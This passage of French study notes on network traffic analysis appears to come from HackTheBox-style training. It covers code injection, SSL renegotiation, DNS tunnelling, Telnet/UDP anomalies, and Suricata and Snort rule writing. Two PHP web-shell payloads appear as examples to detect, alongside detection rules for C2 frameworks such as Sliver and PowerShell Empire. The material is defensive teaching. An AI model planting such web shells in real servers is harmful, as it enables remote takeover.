Supprimez immédiatement le script injecté.
Considérez la mise hors ligne temporaire du serveur concerné pour appliquer des correctifs de sécurité.

Injection de code (PHP, etc.)

Des attaquants peuvent aussi exploiter des champs de saisie pour y insérer du code exécutable (comme PHP), afin d’obtenir un accès à distance ou de prendre le contrôle du serveur.
Exemples typiques de code PHP malveillant :

&lt;?php system($_GET['cmd']); ?&gt;
Permet à l’attaquant d’exécuter des commandes système à distance via l’URL.

&lt;?php echo whoami; ?&gt;
Affiche l’utilisateur courant exécutant le serveur web.
Si ce code est découvert :
Supprimez-le immédiatement.
Identifiez l'origine de l'injection et sécurisez la faille utilisée.

Mesures de prévention contre les attaques XSS et les injections de code
Sanitiser les entrées utilisateur :
Évitez tout contenu HTML/JS non filtré.
Utilisez des fonctions comme htmlspecialchars() (PHP), DOMPurify (JS) ou des ORM sécurisés côté serveur.
Ne jamais exécuter d'entrée utilisateur comme du code :
Aucune donnée envoyée par l'utilisateur ne doit être évaluée dynamiquement (eval(), system(), etc.).
Préférez les appels paramétrés et les API sécurisées.</code></pre></div></details><details open=""><summary style="font-weight:600;font-size:1.5em;line-height:1.3;margin:0"><strong>SSL Renegotiation Attacks</strong></summary><div class="indented"><pre class="code code-wrap" id="1e925200-7eb4-80b6-8667-d4510b08ad1b"><code class="language-JavaScript" style="white-space:pre-wrap;word-break:break-all">Analyse du Trafic HTTPS et Détection des Attaques Basées sur SSL/TLS

Lors de l'analyse du trafic HTTPS, il est essentiel de comprendre les indicateurs du protocole HTTPS qui peuvent révéler des attaques basées sur SSL/TLS. HTTPS repose sur des protocoles de chiffrement, spécifiquement :
Transport Layer Security (TLS)
Secure Sockets Layer (SSL)
Processus de Connexion HTTPS
Handshake (Poignée de main) : Le serveur et le client établissent une connexion, s'accordant sur les algorithmes de chiffrement et échangent des certificats.
Chiffrement : Après la poignée de main, la connexion est chiffrée avec l'algorithme sélectionné.
Échange de Données : Les données chiffrées (pages web, images, etc.) sont échangées entre le client et le serveur.
Déchiffrement : Les deux côtés déchiffrent les données à l'aide de leurs clés privées et publiques.
Attaque de Renégociation SSL

Les attaques de renégociation SSL tentent de négocier des normes de chiffrement plus faibles ou d'exploiter les ressources du serveur, entraînant des vulnérabilités potentielles. Un autre exemple d'attaque liée au chiffrement HTTPS est la vulnérabilité Heartbleed (CVE-2014-0160).
Processus de Handshake TLS et SSL

Pour sécuriser une connexion, un handshake TLS ou SSL est nécessaire, impliquant :
Client Hello : Le client envoie les versions TLS/SSL prises en charge, les suites de chiffrement et des données aléatoires.
Server Hello : Le serveur répond avec la version choisie, la suite de chiffrement et un nonce.
Échange de Certificats : Le serveur envoie son certificat contenant la clé publique.
Échange de Clés : Le client génère un premaster secret, le chiffre avec la clé publique du serveur, et l'envoie au serveur.
Dérivation de la Clé de Session : Les deux parties dérivent des clés de session à l'aide des nonces échangés et du premaster secret.
Messages de Fin : Les deux parties échangent des messages de fin, confirmant la réussite du handshake.
Échange Sécurisé de Données : La communication chiffrée commence.
Détail Algorithmique du Handshake TLS

| Étape du Handshake                  | Calculs pertinents                                                                                                       |
| ----------------------------------- | ------------------------------------------------------------------------------------------------------------------------ |
| Client Hello                    | ClientHello = { ClientVersion, ClientRandom, Ciphersuites, CompressionMethods }                                          |
| Server Hello                    | ServerHello = { ServerVersion, ServerRandom, Ciphersuite, CompressionMethod }                                            |
| Échange de Certificat           | ServerCertificate = { ServerPublicCertificate }                                                                          |
| Échange de Clés                 | ClientDHPublicKey = DH\KeyGeneration(ClientDHPrivateKey) &lt;br&gt; ServerDHPublicKey = DH\KeyGeneration(ServerDHPrivateKey) |
| Premaster Secret                | PremasterSecret = DH\KeyAgreement(ServerDHPublicKey, ClientDHPrivateKey)                                                |
| Dérivation de la Clé de Session | MasterSecret = PRF(PremasterSecret, "master secret", ClientNonce + ServerNonce)                                          |
| Extraction des Clés de Session  | ClientWriteMACKey, ServerWriteMACKey, ClientWriteKey, ServerWriteKey, ClientWriteIV, ServerWriteIV                       |
| Messages de Fin                 | FinishedMessage = PRF(MasterSecret, "finished", Hash(ClientHello + ServerHello))                                         |
Détection des Attaques de Renégociation SSL
Filtrer les Messages de Handshake : Dans Wireshark, utilisez le filtre suivant pour voir uniquement les messages de handshake :

ssl.record.contenttype == 22
Indicateurs des Attaques de Renégociation SSL :
Multiples Client Hellos : Des messages Client Hello répétés d'un même client dans un court laps de temps signalent une attaque, car l'attaquant déclenche à plusieurs reprises la renégociation pour abaisser la suite de chiffrement.
Messages de Handshake Désordonnés : Observer des messages Client Hello après la fin du handshake peut indiquer une manipulation ou une attaque.
Raisons des Attaques de Renégociation SSL
Déni de Service : Une renégociation excessive consomme des ressources serveur, rendant le serveur non réactif.
Exploitation de la Suite de Chiffrement : Les attaquants peuvent tenter une renégociation pour exploiter des configurations de chiffrement faibles.
Cryptanalyse : La renégociation peut faciliter la cryptanalyse en aidant les attaquants à analyser les modèles SSL/TLS, ce qui pourrait exposer des vulnérabilités.</code></pre></div></details><details open=""><summary style="font-weight:600;font-size:1.5em;line-height:1.3;margin:0"><strong>Peculiar DNS Traffic</strong></summary><div class="indented"><pre class="code code-wrap" id="1e925200-7eb4-8099-95e0-dba6a15333f7"><code class="language-JavaScript" style="white-space:pre-wrap;word-break:break-all">Analyse du Trafic DNS

L’analyse du trafic DNS peut être complexe en raison de son volume élevé, mais il est essentiel d'identifier les anomalies pour détecter les activités malveillantes. Voici un aperçu du fonctionnement des requêtes DNS et des méthodes de détection d'activités suspectes.
Requêtes DNS

Les requêtes DNS permettent aux clients de résoudre des noms de domaine en adresses IP et vice versa.
Requêtes DNS Forward (Recherche Directe)

Dans une recherche directe (forward lookup), le client résout un nom de domaine en une adresse IP, suivant ces étapes :
Initiation de la Requête : Le client interroge un domaine, par exemple academy.hackthebox.com.
Vérification du Cache Local : Vérifie le cache DNS local ; si non résolu, continue.
Requête Récursive : Envoie la requête au serveur DNS configuré.
Serveurs Racine : Si nécessaire, le résolveur DNS interroge les serveurs racine.
Serveurs TLD : Le serveur racine dirige vers les serveurs TLD (par exemple, .com).
Serveurs Autoritatifs : Le serveur TLD oriente vers le serveur autoritatif du domaine.
Serveurs Autoritatifs du Domaine : Le résolveur obtient l’adresse IP.
Réponse : L'adresse IP est renvoyée au client.
Requêtes DNS Reverse (Recherche Inverse)

Les recherches inverses sont utilisées pour trouver un nom de domaine à partir d'une adresse IP :
Initiation de la Requête : Le client envoie une requête DNS inverse avec l’adresse IP.
Zones de Recherche Inverse : Le résolveur DNS vérifie s'il est autorisé.
Requête pour le PTR : Le résolveur recherche un enregistrement PTR.
Réponse : Le FQDN (Fully Qualified Domain Name) est retourné si un PTR correspondant est trouvé.
Types d'Enregistrements DNS

| Type d'Enregistrement | Description                                          |
| --------------------- | ---------------------------------------------------- |
| A                 | Associe un nom de domaine à une adresse IPv4         |
| AAAA              | Associe un nom de domaine à une adresse IPv6         |
| CNAME             | Crée un alias pour un domaine                        |
| MX                | Spécifie le serveur de messagerie pour le domaine    |
| NS                | Serveurs de noms autoritatifs pour le domaine        |
| PTR               | Utilisé pour les recherches inverses (IP -&gt; Domaine) |
| TXT               | Spécifie du texte associé au domaine                 |
| SOA               | Informations administratives sur la zone             |
Détection des Tentatives d'énumération DNS

Un volume élevé de requêtes DNS provenant d'un seul hôte peut indiquer une énumération DNS. Pour détecter cela, vous pouvez filtrer le trafic DNS dans Wireshark en utilisant le filtre suivant :

dns
Si des requêtes incluent ANY, cela peut indiquer une énumération DNS, voire une énumération de sous-domaines.
Détection du Tunneling DNS

Le tunneling DNS peut impliquer un nombre important d'enregistrements TXT provenant d'un seul hôte. Les attaquants peuvent exfiltrer des données en les appendant dans le champ TXT des requêtes DNS.
Indicateurs de Tunneling DNS

Examinez le trafic DNS pour détecter des données inhabituelles ou inattendues dans le champ TXT. Les données peuvent être encodées ou chiffrées, souvent en base64 :
Exemple de données encodées en base64 :

echo 'VGhpcyBpcyBhIHNlY3VyZSBrZXk6IEtleTEyMzQ1Njc4OQo=' | base64 -d
Gestion de l'Encodage Multiple

Certains attaquants peuvent encoder les données plusieurs fois ou les chiffrer, rendant leur détection plus difficile :

echo 'encoded_string' | base64 -d | base64 -d | base64 -d
Raisons du Tunneling DNS
Exfiltration de données : Utilisé pour exporter de manière furtive des données d’un réseau.
Commandes et Contrôle : Permet aux systèmes compromis de communiquer avec les serveurs contrôlés par l'attaquant, souvent utilisés dans les botnets.
Bypass de Pare-feu : Les tunnels DNS peuvent contourner les pare-feu ou les proxys se concentrant sur les protocoles HTTP/HTTPS.
Domain Generation Algorithms (DGA) : Les malwares avancés utilisent des algorithmes de génération de domaines (DGA) pour générer des noms de domaine dynamiques, compliquant ainsi la détection.
L'IPFS et le Tunneling DNS

Des acteurs de menaces avancées peuvent utiliser IPFS (Interplanetary File System) pour stocker et récupérer des fichiers malveillants. Cela rend le trafic DNS/HTTP vers des URI comme celles-ci particulièrement significatif :
Exemple d'URI IPFS :

https://cloudflare-ipfs.com/ipfs/QmS6eyoGjENZTMxM7UdqBk6Z3U3TZPAVeJXdgp9VK4o1Sz
IPFS fonctionne de manière décentralisée, ce qui complique sa détection. La surveillance régulière du trafic DNS et HTTP/HTTPS est essentielle pour atténuer ces attaques.</code></pre></div></details><details open=""><summary style="font-weight:600;font-size:1.5em;line-height:1.3;margin:0"><strong>Strange Telnet &amp; UDP Connections</strong></summary><div class="indented"><pre class="code code-wrap" id="1e925200-7eb4-8017-a515-f026cd8673ae"><code class="language-JavaScript" style="white-space:pre-wrap;word-break:break-all">Analyse du Trafic Telnet et UDP : Détection des Activités Suspectes

Lors de l'analyse du trafic réseau, il est essentiel de prêter attention au trafic Telnet et au trafic UDP, qui peuvent parfois révéler des activités suspectes ou anormales qui pourraient autrement passer inaperçues.
Telnet

Le protocole Telnet, bien qu'étant obsolète en raison de ses préoccupations en matière de sécurité, est encore utilisé dans certains systèmes hérités (par exemple, les anciens systèmes Windows NT). Même si Telnet est largement remplacé par SSH pour la communication à distance sécurisée, il peut encore être utile de surveiller le trafic Telnet pour détecter d'éventuelles connexions suspectes ou abusives.
Détection du Trafic Telnet Traditionnel sur le Port 23

Le port 23 est le port par défaut pour Telnet. Lorsque vous observez du trafic sur ce port dans Wireshark, portez une attention particulière aux communications pour repérer tout signe d'abus. Bien que Telnet soit un protocole non crypté et facile à inspecter, les attaquants peuvent parfois chiffrer ou obfusquer les données dans le trafic Telnet. Il est donc nécessaire d'être vigilant et d'inspecter minutieusement les flux de données.
Trafic Telnet Non Reconnu sur des Ports Non Standards

Telnet peut fonctionner sur n'importe quel port, et les attaquants peuvent déplacer les communications Telnet vers des ports non standards pour masquer leurs activités malveillantes. Par exemple, des communications sur le port 9999 peuvent indiquer une tentative de dissimulation. Dans ce cas, il est conseillé de suivre le flux TCP dans Wireshark pour examiner davantage.
Trafic Telnet via IPv6

Si du trafic Telnet via IPv6 est détecté dans un réseau configuré en IPv4, cela pourrait indiquer un accès non autorisé. Pour filtrer spécifiquement le trafic Telnet sur IPv6 dans Wireshark, utilisez le filtre suivant :

((ipv6.srchost == fe80::c9c8:ed3:1b10:f10b) or (ipv6.dsthost == fe80::c9c8:ed3:1b10:f10b)) and telnet
Ce filtre vous aide à isoler le trafic Telnet sur des adresses IPv6 spécifiques pour une inspection plus approfondie.

Surveillance des Communications UDP

Le trafic UDP est souvent utilisé par les attaquants pour contourner la surveillance basée sur TCP, en raison de la nature sans connexion et de la transmission rapide d'UDP. Cette caractéristique peut être avantageuse pour l'exfiltration de données furtives.
TCP vs UDP

Contrairement à TCP, qui nécessite un processus de handshake (SYN, SYN/ACK, ACK) avant la transmission des données, UDP est un protocole sans connexion, ce qui permet une communication plus rapide, mais réduit la fiabilité et la traçabilité des connexions.
Utilisations Courantes de UDP

Lors de l'investigation du trafic UDP, il est important de prendre en compte les cas d'utilisation légitimes suivants :
Applications en temps réel : Des applications telles que la vidéo en streaming, les jeux en ligne, et la voix sur IP utilisent UDP pour des connexions plus rapides.
DNS (Domain Name System) : Les requêtes et réponses DNS sont principalement basées sur UDP.
DHCP (Dynamic Host Configuration Protocol) : UDP est utilisé pour attribuer des adresses IP et configurer les réseaux.
SNMP (Simple Network Management Protocol) : UDP est utilisé pour la surveillance et la gestion du réseau.
TFTP (Trivial File Transfer Protocol) : TFTP, un protocole pour les transferts de fichiers simples, utilise également UDP, notamment dans les systèmes plus anciens.
Anomalies dans le Trafic UDP

Pour un trafic UDP inhabituel, suivez le flux dans Wireshark pour inspecter son contenu et vérifier sa légitimité. Toute communication non attendue ou incohérente pourrait indiquer une activité malveillante, comme de l'exfiltration de données ou des attaques par amplification.

Résumé
Telnet : Bien que de plus en plus obsolète, le trafic Telnet sur des ports non standards ou via IPv6 doit être surveillé de près, surtout s'il provient de sources ou destinations suspectes. La détection de Telnet sur des ports inattendus, comme le port 9999, peut indiquer une tentative d'obscurcissement des activités malveillantes.
UDP : Le trafic UDP, en raison de son caractère sans connexion, peut être utilisé à des fins d'exfiltration furtive de données ou d'attaque. Surveillez attentivement les flux UDP inhabituels, en particulier pour des services comme DNS, DHCP, et SNMP qui utilisent souvent ce protocole.

En étant vigilant et en filtrant correctement les flux, vous pouvez détecter les anomalies de manière efficace et réduire les risques associés à ces types de trafic.</code></pre></div></details></div></details><details open=""><summary style="font-weight:600;font-size:1.5em;line-height:1.3;margin:0">Working with IDS/IPS</summary><div class="indented"><details open=""><summary style="font-weight:600;font-size:1.5em;line-height:1.3;margin:0"><strong>Suricata Fundamentals</strong></summary><div class="indented"><pre class="code code-wrap" id="1ea25200-7eb4-80d9-ab48-d84459f87682"><code class="language-JavaScript" style="white-space:pre-wrap;word-break:break-all">Suricata, géré par l'Open Information Security Foundation (OISF), est une solution de sécurité réseau open-source idéale pour les Systèmes de Détection d'Intrusions (IDS), les Systèmes de Prévention d'Intrusions (IPS) et la Surveillance de la Sécurité du Réseau (NSM). Elle excelle dans l'inspection approfondie des paquets et offre une journalisation complète, aidant les administrateurs à détecter et répondre aux activités suspectes dans le trafic réseau.
Modes de fonctionnement de Suricata
Système de Détection d'Intrusions (IDS) : Surveille passivement le trafic, signale les menaces potentielles et améliore la visibilité du réseau, mais n'intervient pas.
Système de Prévention d'Intrusions (IPS) : Agit de manière proactive en bloquant le trafic suspect avant qu'il n'entre dans le réseau, ce qui améliore la sécurité, mais au prix d'une latence accrue.
Système de Détection et de Prévention d'Intrusions (IDPS) : Combine les fonctionnalités IDS et IPS, surveillant passivement tout en étant capable d'envoyer des paquets de réinitialisation (RST) pour terminer des sessions suspectes.
Surveillance de la Sécurité du Réseau (NSM) : Se contente de journaliser toutes les données réseau, capturant chaque transaction pour une analyse forensique et rétrospective.

Entrées de Suricata
Entrée hors ligne : Traite les fichiers PCAP stockés, adaptés pour l'analyse rétrospective et le test de règles.
Entrée en direct :
LibPCAP : Lit les paquets depuis les interfaces réseau, avec des performances limitées.
NFQ : Mode IPS en ligne sous Linux, utilisant IPTables pour passer les paquets à Suricata pour inspection.
AF\PACKET : Version améliorée de LibPCAP, prenant en charge le multi-threading et adaptée à l'analyse en temps réel sur les systèmes Linux compatibles.

Sorties de Suricata

Suricata génère divers types de journaux, y compris des alertes, des requêtes DNS, des requêtes HTTP et des données de flux réseau. Les principales sorties sont :
EVE JSON : Journalise les événements au format JSON pour être compatible avec des outils comme Logstash, couvrant des types d'événements tels que les alertes, DNS, HTTP et TLS.
Unified2 : Format binaire d'alerte compatible avec Snort, permettant l'intégration avec des outils Snort comme u2spewfoo.

Exemple de consultation du journal EVE JSON

Kailez@htb[/htb]$ less /var/log/suricata/oldeve.json
Configuration de Suricata et règles personnalisées
Lister les fichiers de règles : Voir les fichiers de règles disponibles.

  Kailez@htb[/htb]$ ls -lah /etc/suricata/rules/
  Modifier les variables de Suricata : Définir $HOMENET et $EXTERNALNET dans suricata.yaml pour représenter les segments réseau de confiance et non de confiance, respectivement.
Ajouter des règles personnalisées :
  Exemple de règle pour alerter sur les transactions HTTP :

  alert http any any -&gt; any any (msg:"FILE store all"; filestore; sid:2; rev:1;)
  Manipulation des entrées Suricata
Analyse hors ligne :

  Kailez@htb[/htb]$ suricata -r /home/htb-student/pcaps/suspicious.pcap
  Entrée en direct utilisant AF\PACKET :

  Kailez@htb[/htb]$ sudo suricata --af-packet=ens160
  Utilisation de tcpreplay pour simuler le trafic :

  Kailez@htb[/htb]$ sudo tcpreplay -i ens160 /home/htb-student/pcaps/suspicious.pcap
  Journaux de Suricata
EVE JSON : Un journal complet au format JSON contenant des événements tels que les alertes, HTTP, DNS et des métadonnées TLS.

  Pour ne voir que les événements d'alerte :

  cat /var/log/suricata/oldeve.json | jq -c 'select(.eventtype == "alert")'
  fast.log : Journal texte enregistrant uniquement les alertes, utile pour un examen rapide.

  Kailez@htb[/htb]$ cat /var/log/suricata/oldfast.log
  stats.log : Affiche les statistiques et l'utilisation des ressources, utile pour surveiller les performances.

  Kailez@htb[/htb]$ cat /var/log/suricata/old_stats.log
  Extraction de fichiers

Suricata peut extraire des fichiers transférés via certains protocoles pour une analyse forensique.
Activer l'extraction de fichiers dans suricata.yaml :

  file-store:
    version: 2
    enabled: yes
    force-filestore: yes
  Ajouter une règle d'extraction personnalisée :
  Exemple :

  alert http any any -&gt; any any (msg:"FILE store all"; filestore; sid:2; rev:1;)
  Exécuter Suricata sur un fichier PCAP :

  Kailez@htb[/htb]$ suricata -r /home/htb-student/pcaps/vm-2.pcap
  Inspecter les fichiers extraits :

  Kailez@htb[/htb]$ cd filestore
  Kailez@htb[/htb]$ find . -type f
  Mise à jour et rechargement des règles
Activer le rechargement en direct des règles :

  detect-engine:
reload: true
  Recharger les règles :

  Kailez@htb[/htb]$ sudo kill -usr2 $(pidof suricata)
  Mettre à jour les ensembles de règles avec suricata-update :

  Kailez@htb[/htb]$ sudo suricata-update
  Lister les sources disponibles des ensembles de règles :

  Kailez@htb[/htb]$ sudo suricata-update list-sources
  Activer des ensembles de règles spécifiques :

  Kailez@htb[/htb]$ sudo suricata-update enable-source et/open
  Validation de la configuration Suricata

Pour valider la configuration de Suricata et vous assurer qu'elle est correctement paramétrée :

Kailez@htb[/htb]$ sudo suricata -T -c /etc/suricata/suricata.yaml
Caractéristiques principales de Suricata
Inspection approfondie des paquets : Inspection complète du contenu et des en-têtes des paquets.
Détection de protocoles : Prise en charge de multiples protocoles pour une surveillance complète du réseau.
Détection et prévention des intrusions : Modes polyvalents pour une défense passive et active.
Extraction de fichiers : Capture des fichiers transférés via certains protocoles pour une analyse forensique.
Rechargement des règles en direct : Mise à jour des règles sans interruption du service.
Journalisation complète : JSON, fast.log, et plus encore, pour des insights personnalisés dans le trafic réseau.</code></pre></div></details><details open=""><summary style="font-weight:600;font-size:1.5em;line-height:1.3;margin:0"><strong>Suricata Rule Development Part 1</strong></summary><div class="indented"><pre class="code code-wrap" id="1ea25200-7eb4-8001-9efb-f871bbafa06a"><code class="language-JavaScript" style="white-space:pre-wrap;word-break:break-all">Les règles Suricata sont utilisées pour surveiller le trafic réseau à la recherche de motifs ou d'indicateurs spécifiques, souvent révélateurs de comportements malveillants. Ces règles peuvent fournir des informations cruciales sur l'activité réseau, aider à la détection des menaces et contribuer à des stratégies de sécurité réseau proactives.
Anatomie d'une règle Suricata

Voici un exemple de règle de base de Suricata :

action protocol fromip port -&gt; toip port (msg:"Comportement malveillant connu, possible infection par le malware X"; content:"certaines chaînes"; content:"autres chaînes"; sid:10000001; rev:1;)
Composants de la règle :
En-tête (action protocol from\ip port -&gt; to\ip port) :
Action : Indique à Suricata ce qu'il doit faire lorsque la règle correspond :
alert : Génère une alerte.
log : Journalise le paquet sans alerter.
drop : Bloque le paquet (en mode IPS).
Protocole : Spécifie le protocole réseau (tcp, udp, icmp, etc.).
Direction du trafic :
-&gt; pour le trafic sortant, &lt;- pour le trafic entrant, et &lt;-&gt; pour bidirectionnel.
Ports : Définit les ports source et destination pour l’évaluation.
Message et Contenu de la Règle :
msg : Description affichée lorsque la règle est déclenchée, souvent incluant des informations sur le malware.
content : Chaînes spécifiques ou valeurs que Suricata recherche dans le contenu du paquet.
     Exemple :

     content:"User-Agent|3a 20|Go-http-client/1.1|0d 0a|Accept-Encoding|3a 20|gzip";
     Le contenu peut être optimisé avec des tampons de règles, comme http.accept pour faire correspondre uniquement les en-têtes HTTP Accept.
Options supplémentaires :
nocase : Rend la règle insensible à la casse.
offset : Définit la position de départ dans le paquet pour la correspondance.
distance : Spécifie la distance en octets par rapport à la correspondance précédente.
dsize : Correspond à la taille du charge utile du paquet (par exemple, dsize:&gt;10000 pour les paquets de grande taille).
Métadonnées :
sid : Identifiant de signature unique pour chaque règle.
rev : Numéro de révision indiquant les mises à jour de la règle.
reference : Une URL ou un identifiant fournissant du contexte ou des sources pour la règle.

Exemple d’utilisation de règles avec PCRE

Les expressions régulières compatibles avec Perl (PCRE) augmentent la flexibilité de la détection. Voici un exemple :

alert http any any -&gt; $HOMENET any (msg: "ATTACK [PTsecurity] Apache Continuum &lt;= v1.4.2 CMD Injection"; content: "POST"; httpmethod; content: "/continuum/saveInstallation.action"; offset: 0; depth: 34; httpuri; content: "installation.varValue="; nocase; httpclientbody; pcre: !"/^\$?[\sa-z\\0-9.-](\&amp;|$)/iRP"; flow: toserver, established; sid: 10000048; rev: 1;)
PCRE : Permet la correspondance de motifs complexes en utilisant des expressions régulières. Elles sont entourées de /.../ et peuvent utiliser des drapeaux comme i pour l'insensibilité à la casse et RP pour le positionnement relatif.

Approches de développement des règles IDS/IPS
Détection basée sur les signatures : Correspond aux motifs connus (par exemple, chaînes de malware ou structures de paquets). C’est précis pour les menaces connues, mais limité pour détecter les nouvelles.
Détection basée sur les anomalies : Se concentre sur les comportements réseau inhabituels (par exemple, motifs de transfert de données). Cela aide à détecter les attaques de type zero-day, mais peut générer des faux positifs.
Analyse des protocoles d’état : Suit les états des protocoles pour identifier les transitions ou comportements inhabituels, adapté à la détection de mauvaise utilisation des protocoles.

Exemples de développement de règles Suricata

Exemple 1 : Détection de PowerShell Empire

alert http $HOMENET any -&gt; $EXTERNALNET any (msg:"ET MALWARE Possible activité PowerShell Empire sortante"; flow:established,toserver; content:"GET"; httpmethod; content:"/"; httpuri; depth:1; pcre:"/^(?:login\/process|admin\/get|news)\.php$/RU"; content:"session="; httpcookie; pcre:"/^(?:[A-Z0-9+/]{4})(?:[A-Z0-9+/]{2}==|[A-Z0-9+/]{3}=|[A-Z0-9+/]{4})$/CRi"; content:"Mozilla|2f|5.0|20 28|Windows|20|NT|20|6.1"; httpuseragent; httpstart; content:".php|20|HTTP|2f|1.1|0d 0a|Cookie|3a 20|session="; fastpattern; httpheadernames; content:!"Referer"; content:!"Cache"; content:!"Accept"; sid:2027512; rev:1;)
Détecte les requêtes HTTP GET de PowerShell Empire avec des motifs URI spécifiques et des cookies encodés en base64.

Exemple 2 : Détection de Covenant

alert tcp any any -&gt; $HOMENET any (msg:"détecté par body"; content:"&lt;title&gt;Hello World!&lt;/title&gt;"; detectionfilter: track bysrc, count 4 , seconds 10; priority:1; sid:3000011;)
Déclenche lorsqu'un paquet HTTP contenant &lt;title&gt;Hello World!&lt;/title&gt; apparaît au moins quatre fois dans les 10 secondes provenant de la même source.

Exemple 3 : Détection par taille et compteur de Covenant

alert tcp $HOMENET any -&gt; any any (msg:"détecté par taille et compteur"; dsize:312; detectionfilter: track bysrc, count 3 , seconds 10; priority:1; sid:3000001;)
Détecte les paquets dont la charge utile fait exactement 312 octets, envoyés au moins trois fois dans une fenêtre de 10 secondes.

Exemple 4 : Détection de l'implant C2 Sliver

alert tcp any any -&gt; any any (msg:"Implant C2 Sliver détecté"; content:"POST"; pcre:"/\/(php|api|upload|actions|rest|v1|oauth2callback|authenticate|oauth2|oauth|auth|database|db|namespaces)(.*?)((login|signin|api|samples|rpc|index|admin|register|sign-up)\.php)\?[a-z]{1,2}=[a-z0-9]{1,10}/i"; sid:1000007; rev:1;)
Détecte les requêtes HTTP POST vers des URI associées à Sliver, un framework C2, en utilisant des motifs de répertoires et de fichiers PHP spécifiques.

Règle supplémentaire pour la détection de Sliver via les cookies

alert tcp any any -&gt; any any (msg:"Implant C2 Sliver détecté - Cookie"; content:"Set-Cookie"; pcre:"/(PHPSESSID|SID|SSID|APISID|csrf-state|AWSALBCORS)\=[a-z0-9]{32}\;/"; sid:1000003; rev:1;)
Détecte les cookies avec des noms comme PHPSESSID ou APISID et des valeurs correspondant à un motif alphanumérique de 32 caractères, souvent associé à Sliver.</code></pre></div></details><details open=""><summary style="font-weight:600;font-size:1.5em;line-height:1.3;margin:0"><strong>Suricata Rule Development Part 2 (Encrypted Traffic)</strong></summary><div class="indented"><pre class="code code-wrap" id="1ea25200-7eb4-803e-9c3a-e0ee048981bc"><code class="language-JavaScript" style="white-space:pre-wrap;word-break:break-all">Techniques clés pour la détection des menaces sur le trafic chiffré
Certificats SSL/TLS : Lors de la poignée de main SSL/TLS, des informations telles que l'émetteur, le sujet et le domaine sont échangées et restent non chiffrées. Les attaquants peuvent utiliser des certificats avec des caractéristiques inhabituelles, ce qui permet de les détecter en se basant sur ces anomalies.
Hachage JA3 : Les hachages JA3 fournissent une empreinte unique d’un client SSL/TLS en hachant certains attributs du message Client Hello lors de la poignée de main. Ces hachages aident à identifier des caractéristiques uniques associées à certaines familles de malwares.

Exemples de règles Suricata pour la détection de trafic chiffré
Exemple 5 : Détection de Dridex (TLS chiffré)

alert tls $EXTERNALNET any -&gt; $HOMENET any (msg:"ET MALWARE ABUSE.CH SSL Blacklist Malicious SSL certificate detected (Dridex)"; flow:established,fromserver; content:"|16|"; content:"|0b|"; within:8; bytetest:3,&lt;,1200,0,relative; content:"|03 02 01 02 02 09 00|"; fastpattern; content:"|30 09 06 03 55 04 06 13 02|"; distance:0; pcre:"/^[A-Z]{2}/R"; content:"|55 04 07|"; distance:0; content:"|55 04 0a|"; distance:0; pcre:"/^.{2}[A-Z][a-z]{3,}\s(?:[A-Z][a-z]{3,}\s)?(?:[A-Z](?:[A-Za-z]{0,4}?[A-Z]|(?:\.[A-Za-z]){1,3})|[A-Z]?[a-z]+|[a-z](?:\.[A-Za-z]){1,3})\.?[01]/Rs"; content:"|55 04 03|"; distance:0; bytetest:1,&gt;,13,1,relative; content:!"www."; distance:2; within:4; pcre:"/^.{2}(?P&lt;CN&gt;(?:(?:\d?[A-Z]?|[A-Z]?\d?)(?:[a-z]{3,20}|[a-z]{3,6}[0-9][a-z]{3,6})\.){0,2}?(?:\d?[A-Z]?|[A-Z]?\d?)[a-z]{3,}(?:[0-9-][a-z]{3,})?\.(?!com|org|net|tv)[a-z]{2,9})[01].?(?P=CN)[01]/Rs"; content:!"|2a 86 48 86 f7 0d 01 09 01|"; content:!"GoDaddy"; sid:2023476; rev:5;)
But : Détecte les certificats SSL associés au trojan Dridex en se basant sur des motifs spécifiques dans la poignée de main SSL/TLS.
Options clés :
Valeurs hexadécimales : content:"|16|"; content:"|0b|"; within:8; pour la poignée de main et le type de certificat.
Identifiants de champ : Vérifie les champs countryName et commonName.
OID : Séquences ASN.1 représentant des champs comme countryName, localityName, organizationName, etc.
PCRE : Vérifie les motifs dans le commonName avec une correspondance de structure supplémentaire.

Test de la règle : Décommentez cette règle dans local.rules et exécutez Suricata sur le fichier dridex.pcap.

Exemple 6 : Détection de Sliver (TLS chiffré)

alert tls any any -&gt; any any (msg:"Sliver C2 SSL"; ja3.hash; content:"473cd7cb9faa642487833865d516e578"; sid:1002; rev:1;)
But : Détecte le trafic C2 de Sliver en faisant correspondre un hachage JA3 connu.
Options clés :
ja3.hash : Recherche le hachage JA3 spécifique associé à Sliver.

Test de la règle* : Obtenez le hachage JA3 en utilisant l'outil ja3 sur le fichier sliverenc.pcap. Décommentez cette règle dans local.rules et exécutez Suricata sur sliverenc.pcap pour valider la détection.</code></pre></div></details><details open=""><summary style="font-weight:600;font-size:1.5em;line-height:1.3;margin:0">Snort Fundamentals</summary><div class="indented"><pre class="code code-wrap" id="1ea25200-7eb4-80b8-8828-c06829e44b96"><code class="language-JavaScript" style="white-space:pre-wrap;word-break:break-all">Snort : Présentation Générale

Snort est un outil open-source qui agit comme un système de détection d'intrusion (IDS) et un système de prévention d'intrusion (IPS). Il peut également être utilisé comme analyseur de paquets ou renifleur de trafic.
Snort inspecte l’ensemble du trafic réseau et peut enregistrer toutes les activités, offrant une visibilité complète au niveau de la couche application. Son comportement est dirigé par des règles spécifiques qui définissent ce qu’il doit surveiller ou identifier.

Modes de Fonctionnement de Snort
IDS/IPS en mode inline : Permet de bloquer activement le trafic lorsqu’il fonctionne comme IPS.
IDS passif : Observe et journalise le trafic sans l’interrompre.
IDS basé sur le réseau : Surveille le trafic réseau provenant de plusieurs hôtes.
IDS basé sur l’hôte : Rarement utilisé avec Snort (des outils spécialisés sont plus adaptés).

Modules DAQ (Data Acquisition)

Les modules DAQ permettent à Snort d'interagir avec les sources de données réseau.
Mode passif : Observe le trafic sans le bloquer.
Mode inline : Peut bloquer le trafic selon les règles définies (ex. : utilisation de l’option -Q avec le module DAQ afpacket).

Architecture de Snort
Sniffer de paquets : Décrypte le trafic réseau et transmet les paquets aux préprocesseurs.
Préprocesseurs : Analysent les types de paquets et leur comportement. Configurés dans le fichier snort.lua, ils détectent par exemple le trafic HTTP ou les scans.
Moteur de détection : Compare les paquets aux règles Snort.
Journalisation et alertes : Les paquets correspondants aux règles sont enregistrés, souvent dans syslog ou des bases de données, à l’aide de plugins de sortie définis dans snort.lua.

Configuration de Snort
Fichiers de configuration :
snort.lua : Fichier principal, contenant les variables réseau, les décodeurs, le moteur de détection, et les sorties.
snortdefaults.lua : Fournit des configurations par défaut.

Pour visualiser ou modifier la configuration :

sudo more /root/snorty/etc/snort/snort.lua
Valider la configuration :

